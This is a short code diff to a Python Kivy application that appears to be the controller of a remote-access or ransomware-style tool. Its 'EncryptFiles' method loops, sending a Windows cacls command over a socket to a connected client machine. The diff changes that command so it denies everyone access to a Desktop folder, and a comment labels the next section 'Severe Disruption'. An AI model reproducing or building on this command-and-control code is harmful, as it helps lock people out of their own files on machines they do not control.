@@ -301,11 +301,11 @@ class Main(MDApp):
 
     def EncryptFiles(self):
         while True:
-            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:f'
+            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:n'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             
-            output = self.currConn.recv(8096).decode()
+            output = self.currConn.recv(10248).decode()
             print('Output: ', output)
 
     #Zees Severe Disruption
